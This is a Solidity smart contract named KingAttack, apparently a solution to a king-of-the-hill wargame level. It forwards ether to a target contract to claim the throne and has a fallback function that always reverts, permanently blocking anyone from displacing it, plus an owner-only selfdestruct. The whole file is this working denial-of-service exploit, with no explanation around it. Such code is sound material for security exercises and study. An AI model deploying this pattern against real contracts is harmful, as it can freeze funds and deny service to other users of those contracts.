//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract KingAttack is Owner {

    constructor () payable {

    }

    function attackKing (address payable _to) external payable isOwner {
        _to.call{value: msg.value}('');
    }

    function kill () external isOwner {
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {
        revert("nope");
    }
}